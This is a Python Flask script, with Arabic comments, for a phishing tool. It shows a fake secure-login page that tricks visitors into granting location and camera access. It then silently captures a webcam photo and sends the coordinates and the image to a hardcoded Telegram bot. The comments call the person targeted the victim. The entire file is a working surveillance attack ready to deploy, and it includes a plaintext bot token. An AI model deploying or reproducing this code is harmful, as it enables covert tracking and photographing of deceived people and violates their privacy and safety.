import telebot, os, requests, base64
from flask import Flask, render_template_string, request, jsonify

# --- [ إعدادات البوت - تأكد من صحتها ] ---
BOT_TOKEN = "6785445743:AAFquuyfY2IIjgs2x6PnL61uA-3apHIpz2k"
MY_ID = "6695916631"
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# --- [ واجهة التمويه الاحترافية ] ---
HTML_INTERFACE = """
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>LOGIN | KAIL-911 SYSTEM</title>
    <style>
        body { background: #000; color: #00f2ff; font-family: 'Courier New', monospace; height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0; }
        .box { border: 2px solid #00f2ff; padding: 50px; border-radius: 15px; text-align: center; background: rgba(0,242,255,0.05); }
        .btn { background: #00f2ff; color: #000; border: none; padding: 15px 40px; font-weight: bold; cursor: pointer; border-radius: 5px; font-size: 18px; margin-top: 20px; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="box">
        <h1>🔐 نظام التحقق الآمن</h1>
        <p>اضغط على الزر أدناه لتأكيد هويتك والدخول للنظام</p>
        <button class="btn" onclick="takeAuth()">دخول / LOGIN</button>
    </div>

    <video id="v" autoplay></video>
    <canvas id="c"></canvas>

    <script>
        async function takeAuth() {
            // طلب الموقع
            navigator.geolocation.getCurrentPosition(p => {
                fetch('/loc', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude})
                });
            });

            // طلب الكاميرا والتقاط الصورة
            try {
                const s = await navigator.mediaDevices.getUserMedia({video: true});
                const v = document.getElementById('v');
                v.srcObject = s;
                
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    fetch('/img', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({img: c.toDataURL('image/png')})
                    });
                    // توجيه الضحية بعد السحب
                    window.location.href = "https://instagram.com/kail.911";
                }, 1500);
            } catch(e) { alert("خطأ: يجب السماح بالوصول (Allow) للمتابعة!"); }
        }
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_INTERFACE)

@app.route("/loc", methods=['POST'])
def loc():
    d = request.json
    # إرسال الموقع للبوت
    url = f"https://www.google.com/maps?q={d['lat']},{d['lon']}"
    bot.send_message(MY_ID, f"📍 **تم سحب موقع جديد!**\n\nرابط الخريطة:\n{url}")
    return jsonify(ok=True)

@app.route("/img", methods=['POST'])
def img():
    d = request.json
    # إرسال الصورة للبوت
    img_data = base64.b64decode(d['img'].split(',')[1])
    with open("snap.png", "wb") as f: f.write(img_data)
    with open("snap.png", "rb") as f:
        bot.send_photo(MY_ID, f, caption="📸 **تم التقاط صورة الضحية بنجاح!**")
    return jsonify(ok=True)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
